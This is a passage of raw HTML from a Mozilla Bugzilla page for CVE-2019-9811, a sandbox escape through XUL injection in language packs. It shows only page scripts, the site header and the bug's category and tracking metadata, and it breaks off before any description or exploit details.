<!DOCTYPE html>
<html lang="en">
  <head>
      <meta charset="UTF-8">
<meta property="og:type" content="website">
<meta property="og:title" content="1538007 - (CVE-2019-9811) [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">
<meta property="og:url" content="https://bugzilla.mozilla.org/show_bug.cgi?id=1538007">
<meta property="og:description"
      content="RESOLVED (peterv) in Core - Internationalization: Localization. Last updated 2021-10-20.">
<meta name="twitter:label1" value="Type">
<meta name="twitter:data1" value="defect">
<meta name="twitter:label2" value="Priority">
<meta name="twitter:data2" value="P1">

    <meta name="viewport" content="width=1024">
    <meta name="color-scheme" content="dark light">
    <meta name="generator" content="Bugzilla 20211025.1">
    <meta name="bugzilla-global" content="dummy"
        id="bugzilla-global" data-bugzilla="{&quot;api_token&quot;:&quot;&quot;,&quot;config&quot;:{&quot;basepath&quot;:&quot;\/&quot;},&quot;constant&quot;:{&quot;COMMENT_COLS&quot;:80},&quot;param&quot;:{&quot;maxattachmentsize&quot;:&quot;10240&quot;,&quot;maxusermatches&quot;:&quot;50&quot;,&quot;splinter_base&quot;:&quot;\/page.cgi?id=splinter.html&amp;ignore=\/&quot;},&quot;string&quot;:{&quot;bug_type_required&quot;:&quot;You must select a Type for this bug&quot;,&quot;component_required&quot;:&quot;You must select a Component for this bug&quot;,&quot;description_required&quot;:&quot;You must enter a Description for this bug&quot;,&quot;short_desc_required&quot;:&quot;You must enter a Summary for this bug&quot;,&quot;version_required&quot;:&quot;You must select a Version for this bug&quot;},&quot;user&quot;:{&quot;is_new&quot;:1,&quot;login&quot;:&quot;&quot;}}">
    <title>1538007 - (CVE-2019-9811) [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack</title>

<link rel="Top" href="/">

  


  
    <link rel="Show" title="Dependency Tree"
          href="/showdependencytree.cgi?id=1538007&amp;hide_resolved=1">
      <link rel="Show" title="Dependency Graph"
            href="/showdependencygraph.cgi?id=1538007">

      <link rel="Show" title="Bug Activity"
            href="/show_activity.cgi?id=1538007">

<link href="/static/v20211025.1/skins/yui.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/standard/global.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BugModal/web/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/BMO/web/styles/bug_modal.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/EditComments/web/styles/inline-editor.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-structure-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/js/jquery/ui/jquery-ui-theme-min.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/skins/lib/prism.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Needinfo/web/styles/needinfo.css" rel="stylesheet" type="text/css"><link href="/static/v20211025.1/extensions/Review/web/styles/badge.css" rel="stylesheet" type="text/css">



    
<script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/jquery/jquery-min.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/jquery/ui/jquery-ui-min.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/yui.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/jquery/plugins/contextMenu/contextMenu-min.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/jquery/plugins/devbridgeAutocomplete/devbridgeAutocomplete-min.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/global.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/util.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/dropdown.js"></script>

      <script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o">
          YAHOO.namespace('bugzilla');
          if ( "onpagehide" in window || YAHOO.env.ua.gecko) {
              YAHOO.util.Event._simpleRemove(window, "unload",
                                             YAHOO.util.Event._unload);
          }BUGZILLA.value_descs = JSON.parse('{\"bug_status\":{},\"resolution\":{\"\":\"---\"}}');

  
    var tracking_flags_str = "{\"flags\":{\"tracking\":{\"cf_status_firefox_esr68\":\"fixed\",\"cf_status_thunderbird_esr78\":\"---\",\"cf_status_firefox_esr60\":\"fixed\",\"cf_tracking_firefox93\":\"---\",\"cf_tracking_firefox_esr78\":\"---\",\"cf_tracking_firefox68\":\"+\",\"cf_status_firefox_esr78\":\"---\",\"cf_tracking_thunderbird_esr91\":\"---\",\"cf_tracking_firefox66\":\"+\",\"cf_tracking_firefox94\":\"---\",\"cf_tracking_firefox67\":\"+\",\"cf_tracking_firefox_esr60\":\"68+\",\"cf_tracking_thunderbird_esr78\":\"---\",\"cf_status_firefox94\":\"---\",\"cf_status_firefox93\":\"---\",\"cf_tracking_firefox_relnote\":\"---\",\"cf_tracking_firefox95\":\"---\",\"cf_status_firefox66\":\"wontfix\",\"cf_status_firefox_esr91\":\"---\",\"cf_tracking_firefox69\":\"+\",\"cf_tracking_firefox_esr91\":\"---\",\"cf_status_firefox68\":\"fixed\",\"cf_status_firefox95\":\"---\",\"cf_status_thunderbird_esr91\":\"---\",\"cf_status_firefox67\":\"wontfix\",\"cf_status_firefox69\":\"fixed\"},\"project\":{\"cf_webcompat_priority\":\"---\",\"cf_tracking_firefox_sumo\":\"---\",\"cf_a11y_review_project_flag\":\"---\",\"cf_fission_milestone\":\"---\",\"cf_root_cause\":\"---\"}},\"comments\":{\"cf_tracking_firefox_esr60\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr91\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox67\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox69\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_relnote\":{\"?\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox_sumo\":{\"none-needed\":\"Release Note Request (optional, but appreciated)\\n[Why is this notable]:\\n[Affects Firefox for Android]:\\n[Suggested wording]:\\n[Links (documentation, blog post, etc)]:\"},\"cf_tracking_firefox93\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox_esr78\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox95\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox94\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_a11y_review_project_flag\":{\"requested\":\"Description:\\nPlease provide an explanation of the feature or change. Include a description of the user scenario in which it would be used and how the user would complete the task(s).\\nScreenshots and visual UI specs are welcome, but please include sufficient accompanying explanation so that blind members of the accessibility team are able to understand the feature\/change.\\n\\nHow do we test this?\\nIf there is an implementation to test, please provide instructions for testing it; e.g. setting preferences, other preparation, how to trigger the UI, etc.\\n\\nWhen will this ship?\\nTracking bug\/issue:\\nDesign documents (e.g. Product Requirements Document, UI spec):\\nEngineering lead:\\nProduct manager:\\n\\nThe accessibility team has developed the Mozilla Accessibility Release Guidelines which outline what is needed to make user interfaces accessible:\\nhttps:\/\/wiki.mozilla.org\/Accessibility\/Guidelines\\nPlease describe the accessibility guidelines you considered and what steps you\'ve taken to address them:\\n\\nDescribe any areas of concern to which you want the accessibility team to give special attention:\"},\"cf_tracking_firefox66\":{\"?\":\"[Tracking Requested - why for this release]:\"},\"cf_tracking_firefox68\":{\"?\":\"[Tracking Requested - why for this release]:\"}},\"types\":[\"tracking\"]}";
    var TrackingFlags = $.parseJSON(tracking_flags_str);

  

  
  BUGZILLA.bug_id = 1538007;
  BUGZILLA.bug_title = '1538007 - (CVE-2019-9811) [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack';
  BUGZILLA.bug_summary = '[ZDI-CAN-8374] Sandbox escape: XUL injection in language pack';
  BUGZILLA.bug_url = 'https:\/\/bugzilla.mozilla.org\/show_bug.cgi?id=1538007';
  BUGZILLA.bug_keywords = 'csectype-priv-escalation, csectype-sandbox-escape, sec-high',
  BUGZILLA.user = {
    id: 0,
    login: '',
    is_insider: false,
    is_timetracker: false,
    can_tag: false,
    timezone: 'America\/Los_Angeles',
    settings: {
      quote_replies: 'quoted_reply',
      zoom_textareas: true,
      remember_collapsed: true,
      inline_attachments: true,
      autosize_comments: false
    }
  };

  BUGZILLA.bug_secure = false;
      </script>
<script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/BugModal/web/autosize.min.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/ProdCompSearch/web/js/prod_comp_search.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/BugModal/web/bug_modal.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/BugModal/web/comments.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/ComponentWatching/web/js/overlay.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/bugzilla-readable-status-min.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/field.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/comments.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/TrackingFlags/web/js/flags.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/BMO/web/js/firefox-crash-table.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/MozChangeField/web/js/severity-s1-priority-p1.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/MozChangeField/web/js/clear-tracking-priority-s1.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/MozChangeField/web/js/set-tracking-severity-s1.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/lib/prism.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/GoogleAnalytics/web/js/analytics.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/js/lib/md5.min.js"></script><script nonce="9zXVxHcRGAor6sFAXxbFYimEKL1CIKTzJF9KzZLISDhJB77o" src="/static/v20211025.1/extensions/Review/web/js/badge.js"></script>

    

    
    <link rel="search" type="application/opensearchdescription+xml"
                       title="Bugzilla@Mozilla" href="/search_plugin.cgi"><link rel="shortcut icon" href="/extensions/BMO/web/images/favicon.ico">
<link rel="canonical" href="https://bugzilla.mozilla.org/show_bug.cgi?id=1538007">
<link rel="shorturl" href="https://bugzilla.mozilla.org/1538007"><meta name="google-analytics" content="UA-36116321-3" data-location="https://bugzilla.mozilla.org/bug/show-modal" data-title="1538007 - (CVE-2019-9811) [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">
<script async src="https://www.google-analytics.com/analytics.js"></script><meta name="robots" content="noarchive">
  </head>



  <body
        class="bugzilla-mozilla-org
               skin-standard bug_modal yui-skin-sam">



<div id="wrapper">

<header id="header" role="banner">
  <div class="inner">
    <h1 id="header-title" class="title"><a href="https://bugzilla.mozilla.org/home" title="Go to home page">Bugzilla</a></h1>
    <form role="search" id="header-search" class="quicksearch" action="/buglist.cgi" data-no-csrf>
      <section class="searchbox-outer dropdown" role="combobox" aria-expanded="false" aria-haspopup="listbox"
               aria-labelledby="header-search-label" aria-owns="header-search-dropdown">
        <h2 id="header-search-label">Quick Search</h2>
        <span class="icon" aria-hidden="true"></span>
        <input role="searchbox" id="quicksearch_top" class="dropdown-button" name="quicksearch" autocomplete="off"
               value="" placeholder="Search Bugs"
               title="Enter a bug number or some search terms" aria-controls="header-search-dropdown"
               aria-label="Quick Search"><div id="header-search-dropdown" class="dropdown-content right" role="listbox" style="display: none;">
  <div id="header-search-dropdown-wrapper">
  </div>
</div>
      </section>
    </form>
    <nav id="header-nav">
      <ul class="links">
        <li class="link-browse">
          <a href="/describecomponents.cgi" title="Browse bugs by component">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Browse</span>
          </a>
        </li>
        <li class="link-search">
          <a href="/query.cgi?format=advanced" title="Search bugs using various criteria">
            <span class="icon" aria-hidden="true"></span>
            <span class="label">Advanced Search</span>
          </a>
        </li>
      </ul>
      <div class="dropdown">
        <button type="button" id="header-tools-menu-button" class="dropdown-button minor" title="More tools…"
                aria-label="More tools…" aria-expanded="false" aria-haspopup="true" aria-controls="header-tools-menu">
          <span class="icon" aria-hidden="true"></span>
        </button>
        <ul class="dropdown-content left" id="header-tools-menu" role="menu" style="display:none;">
          <li role="presentation">
            <a href="/report.cgi" role="menuitem" tabindex="-1">Reports</a>
          </li>
            <li role="separator"></li>
            <li role="presentation">
              <a href="https://bmo.readthedocs.io/en/latest/" role="menuitem" tabindex="-1">Documentation</a>
            </li>
        </ul>
      </div>
    </nav>
      <ul id="header-login" class="links">
          <li id="moz_new_account_container_top"><a href="/createaccount.cgi">New Account</a></li><li id="mini_login_container_top">
  <a id="login_link_top" href="/index.cgi?GoAheadAndLogIn=1"
     class='show_mini_login_form' data-qs-suffix="_top">Log In</a>

  <div id="mini_login_top" class="mini-popup mini_login bz_default_hidden"><span id="github_mini_login_top" class="mini_login_top">
    <form method="post" action="/github.cgi">
      <input type="hidden" name="github_secret" value="sn7ZKsZEnzvp05MmG4biShW4mMgxOceFlpFFnmu01RbZydrZmnK02FkLKanCsmMEg27yb7nEVpDHPD2gOEyLCQrYQ6KOI3Pf0NcLUM7P9k800hSOYX1nWTzLUsYl9yaEClKsRz3CjA3iGfQvi7MFXykzBfaYKsoQxuMqrADrifvibpZfpVYTH3cqNrR82ND7L1Tzxc8H51tePk5SHCPzRVCLF3GCh0mqV3Ri8XK0GwvSz3iI0UkGjfYqxFP64bXN">
      <input type="hidden" name="target_uri" value="https://bugzilla.mozilla.org/show_bug.cgi">
      <input type="image" src="/extensions/GitHubAuth/web/images/sign_in.png" height="22" width="75" align="absmiddle"
             alt="Sign in with GitHub"
             title="Sign in with GitHub"> or
    </form>
  </span>

  <form action="/show_bug.cgi?id=1538007" method="POST"
        data-qs-suffix="_top">

    <input id="Bugzilla_login_top"
           class="bz_login"
           name="Bugzilla_login"
           title="Login"
           placeholder="Email"
           aria-label="Email"
           type="email"
           required
    >
    <input class="bz_password"
           id="Bugzilla_password_top"
           name="Bugzilla_password"
           type="password"
           title="Password"
           placeholder="Password"
           aria-label="Password"
           required
    >
    <input class="bz_password bz_default_hidden bz_mini_login_help" type="text"
           id="Bugzilla_password_dummy_top" value="password"
           title="Password"
    >
      <input type="checkbox" id="Bugzilla_remember_top"
             name="Bugzilla_remember" value="on" class="bz_remember"
                 checked>
      <label for="Bugzilla_remember_top">Remember</label>
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
           class="check_mini_login_fields"
            id="log_in_top">
    <a href="#" id="hide_mini_login_top" aria-label="Close"
       class="close-button hide_mini_login_form" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
<li id="forgot_container_top">
  <a id="forgot_link_top" href="/index.cgi?GoAheadAndLogIn=1#forgot"
     class='show_forgot_form'
     data-qs-suffix="_top">Forgot Password</a>
  <div id="forgot_form_top" class="mini-popup mini_forgot bz_default_hidden">
  <form action="/token.cgi" method="post">
    <input type="email" name="loginname" size="20" placeholder="Email" aria-label="Email" required>
    <input id="forgot_button_top" value="Reset Password"
           type="submit">
    <input type="hidden" name="a" value="reqpw">
    <input type="hidden" id="token_top" name="token" value="1635623405-KdGigsY_3P3Y__9DaIekhEe6umBcagB-FWAVT2sKT2Y">
    <a href="#" class="close-button hide_forgot_form" aria-label="Close" data-qs-suffix="_top">
      <span class="icon" aria-hidden="true"></span>
    </a>
  </form>
  </div>
</li>
      </ul><div id="header-external-links" class="dropdown first">
  <button type="button" id="header-external-menu-button" class="dropdown-button minor" title="Mozilla"
          aria-label="Mozilla" aria-expanded="false" aria-haspopup="true" aria-controls="header-external-menu">
    <img src="/static/v20211025.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg" width="32" height="32" alt="">
  </button>
  <ul class="dropdown-content right" id="header-external-menu" role="menu" style="display:none;">
    <li role="presentation">
      <a href="https://www.mozilla.org/" role="menuitem" tabindex="-1">Mozilla Home</a>
    </li>
    <li role="separator"></li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/" role="menuitem" tabindex="-1">Privacy</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/privacy/websites/#cookies" role="menuitem" tabindex="-1">Cookies</a>
    </li>
    <li role="presentation">
      <a href="https://www.mozilla.org/about/legal/" role="menuitem" tabindex="-1">Legal</a>
    </li>
  </ul>
</div>
  </div>
</header> 


<main id="bugzilla-body" tabindex="-1">

<aside id="message-container" role="complementary">
  <noscript>
    <div class="noscript">
      <div class="inner">
        <p>Please enable JavaScript in your browser to use all the features on this site.</p>
      </div>
    </div>
  </noscript>
</aside>

<div id="main-inner">




<div role="toolbar" id="page-toolbar">
  <div role="group" class="buttons">
    <button type="button" id="copy-summary" class="secondary"
      title="Copy bug number and summary to your clipboard">Copy Summary</button>
    <div id="clip-container" style="display:none"><input type="text" id="clip"></div>
    <div class="dropdown">
      <button type="button" id="action-menu-btn" aria-haspopup="true" aria-label="View"
        aria-expanded="false" aria-controls="action-menu" class="dropdown-button secondary">View &#9662;</button>
      <ul class="dropdown-content left" id="action-menu" role="menu" style="display:none;">
        <li role="presentation">
          <a id="action-reset" role="menuitem" tabindex="-1">Reset Sections</a>
        </li>
        <li role="presentation">
          <a id="action-expand-all" role="menuitem" tabindex="-1">Expand All Sections</a>
        </li>
        <li role="presentation">
          <a id="action-collapse-all" role="menuitem" tabindex="-1">Collapse All Sections</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a id="action-history" role="menuitem" tabindex="-1">History</a>
        </li>
        <li role="separator"></li>
        <li role="presentation">
          <a href="/rest/bug/1538007" role="menuitem" tabindex="-1">JSON</a>
        </li>
        <li role="presentation">
          <a href="/show_bug.cgi?ctype=xml&amp;id=1538007" role="menuitem" tabindex="-1">XML</a>
        </li>
      </ul>
    </div>
  </div>
</div>



<div role="status" id="io-error" style="display:none"></div>
<div role="status" id="floating-message" style="display:none">
  <div id="floating-message-text"></div>
</div>
<section class="module"
>
  <div class="module-content"
  >
  <div id="summary-container">
    <div class="field indent" id="field-status_summary"
>


  
    <div class=" container">
        <span id="field-value-status_summary">
      <span class="bug-status-label text" data-status="closed">Closed</span>
      <span id="field-value-bug_id">
        <a href="/show_bug.cgi?id=1538007">Bug 1538007</a>
          <span class="edit-hide">(CVE-2019-9811)</span>
      </span>
      <span>
        <span class="bug-time-label">Opened <span class="rel-time" title="2019-03-21 14:29 PDT" data-time="1553203743">3 years ago</span></span>
          <span class="bug-time-label">Closed <span class="rel-time" title="2019-07-01 10:37 PDT" data-time="1562002643">2 years ago</span></span>
      </span>
        </span>
    </div>

  
</div>
<div class="field indent edit-hide"
>


  
    <div class=" container">
      

      <h1 id="field-value-short_desc">[ZDI-CAN-8374] Sandbox escape: XUL injection in language pack</h1>
    </div>

  
</div>

    <div class="field edit-show" id="field-short_desc" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc" id="short_desc-help-link" class="help">Summary:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-short_desc">
            [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack

        </span>
    </div>

  
</div>
  </div>
  </div>
</section>


<section class="module" id="module-categories"
>
    <header id="module-categories-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Categories section"
           data-label-collapsed="Expand Categories section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-categories-content"
             aria-expanded="true"
             aria-labeledby="module-categories-title"
             aria-describedby="module-categories-subtitle"></div>
        <h2 class="module-title" id="module-categories-title">Categories</h2>
          <h3 class="module-subtitle" id="module-categories-subtitle">
            (Core :: Internationalization: Localization, defect, P1)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-categories-content"
  ><div class="fields-lhs">

    <div class="field" id="field-product"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core" id="product-help-link" class="help">Product:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-product">
      <div class="name-info-outer dropdown">
        <span id="product-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="product-info">Core
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="product-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Product description and actions">
          <header>
            <div class="title">Core</div>
            <div class="description">Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the <a href="https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox">Firefox</a> product. (<a href="https://wiki.mozilla.org/Modules/All#Core">More info</a>)</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Product</a></div>
            <div><a href="/enter_bug.cgi?product=Core"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Product</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core"
                         data-label-watch="Watch This Product" data-label-unwatch="Unwatch This Product"
                         data-source="BugModal">Watch This Product</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-component"
>
    <div class="name">
        <a href="/describecomponents.cgi?product=Core&component=Internationalization%3A%20Localization#Internationalization%3A%20Localization" id="component-help-link" class="help">Component:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-component">
      <div class="name-info-outer dropdown">
        <span id="component-name" class="dropdown-button" tabindex="0" role="button"
             aria-haspopup="menu" aria-controls="component-info">Internationalization: Localization
          <span class="icon" aria-hidden="true">&#x25BE;</span>
        </span>
        <aside id="component-info" class="name-info-popup dropdown-content right hover-display" hidden role="menu"
               aria-label="Component description and actions">
          <header>
            <div class="title">Core :: Internationalization: Localization</div>
            <div class="description">Localization is the process of adapting software for a specific international market; this process includes translating the user interface, resizing dialog boxes, replacing icons and other culturally sensitive graphics (if necessary) as well as customizing features.</div>
          </header>
          <li role="separator"></li>
          <div class="actions">
            <div><a href="/buglist.cgi?product=Core&amp;component=Internationalization%3A%20Localization&amp;bug_status=__open__"
                    target="_blank" role="menuitem" tabindex="-1">See Open Bugs in This Component</a></div>
            <div><a href="/buglist.cgi?product=Core&amp;component=Internationalization%3A%20Localization&amp;chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__"
                    target="_blank" role="menuitem" tabindex="-1">Recently Fixed Bugs in This Component</a></div>
            <div><a href="/enter_bug.cgi?product=Core&amp;component=Internationalization%3A%20Localization"
                    target="_blank" role="menuitem" tabindex="-1">File New Bug in This Component</a></div>
            <div><button disabled type="button" class="secondary component-watching" role="menuitem" tabindex="-1"
                         data-product="Core" data-component="Internationalization: Localization"
                         data-label-watch="Watch This Component" data-label-unwatch="Unwatch This Component"
                         data-source="BugModal">Watch This Component</button></div>
          </div>
        </aside>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-version" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#version" id="version-help-link" class="help">Version:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-version">
            Trunk

        </span>
    </div>

  
</div>

    <div class="field edit-show" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform" id="-help-link" class="help">Platform:
        </a>
    </div>


  
    <div class=" container"><div class="field inline" id="field-rep_platform"
>


  
    <div class="value">
        <span id="field-value-rep_platform">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline" id="field-op_sys"
>


  
    <div class="value">
        <span id="field-value-op_sys">
            Unspecified

        </span>
    </div>

  
</div><div class="field indent inline"
>


  
    <div class=" container">
    </div>

  
</div>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field contains-buttons" id="field-bug_type"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type" id="bug_type-help-link" class="help">Type:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_type">
      <span class="bug-type-label iconic-text" data-type="defect">
        <span class="icon" aria-hidden="true"></span>defect</span>
        </span>
    </div>

  
</div>

    <div class="field" id="field-importance"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority" id="importance-help-link" class="help">Priority:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-importance"><div class="field inline" id="field-priority"
>


  
    <div class="value">
        <span id="field-value-priority">P1
        </span>
    </div>

  
</div><div class="field inline" id="field-bug_severity"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity" id="bug_severity-help-link" class="help">Severity:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_severity">
            blocker

        </span>
    </div>

  
</div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-cf_fx_points" style="display:none"
>
    <div class="name">Points:
    </div>


  
    <div class="value">
        <span id="field-value-cf_fx_points">
            ---

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-tracking"
>
    <header id="module-tracking-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Tracking section"
           data-label-collapsed="Expand Tracking section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-tracking-content"
             aria-expanded="true"
             aria-labeledby="module-tracking-title"
             aria-describedby="module-tracking-subtitle"></div>
        <h2 class="module-title" id="module-tracking-title">Tracking</h2>
          <h3 class="module-subtitle" id="module-tracking-subtitle">
            (<span id="readable-bug-status" data-readable-bug-status="{&quot;cf_tracking_firefox69&quot;:&quot;+&quot;,&quot;cf_status_firefox95&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_status_firefox68&quot;:&quot;fixed&quot;,&quot;resolution&quot;:&quot;FIXED&quot;,&quot;cf_status_thunderbird_esr91&quot;:&quot;---&quot;,&quot;target_milestone&quot;:&quot;---&quot;,&quot;cf_status_firefox67&quot;:&quot;wontfix&quot;,&quot;cf_status_firefox69&quot;:&quot;fixed&quot;,&quot;status&quot;:&quot;RESOLVED&quot;,&quot;cf_status_firefox66&quot;:&quot;wontfix&quot;,&quot;cf_tracking_firefox95&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr91&quot;:&quot;---&quot;,&quot;cf_root_cause&quot;:&quot;---&quot;,&quot;cf_a11y_review_project_flag&quot;:&quot;---&quot;,&quot;cf_tracking_firefox67&quot;:&quot;+&quot;,&quot;flags&quot;:[],&quot;cf_tracking_firefox_esr60&quot;:&quot;68+&quot;,&quot;cf_webcompat_priority&quot;:&quot;---&quot;,&quot;cf_status_firefox94&quot;:&quot;---&quot;,&quot;cf_tracking_thunderbird_esr78&quot;:&quot;---&quot;,&quot;cf_fission_milestone&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_sumo&quot;:&quot;---&quot;,&quot;cf_status_firefox93&quot;:&quot;---&quot;,&quot;cf_tracking_firefox_relnote&quot;:&quot;---&quot;,&quot;cf_status_thunderbird_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr68&quot;:&quot;fixed&quot;,&quot;id&quot;:1538007,&quot;priority&quot;:&quot;P1&quot;,&quot;cf_tracking_firefox_esr78&quot;:&quot;---&quot;,&quot;cf_status_firefox_esr60&quot;:&quot;fixed&quot;,&quot;cf_tracking_firefox93&quot;:&quot;---&quot;,&quot;keywords&quot;:[&quot;csectype-priv-escalation&quot;,&quot;csectype-sandbox-escape&quot;,&quot;sec-high&quot;],&quot;cf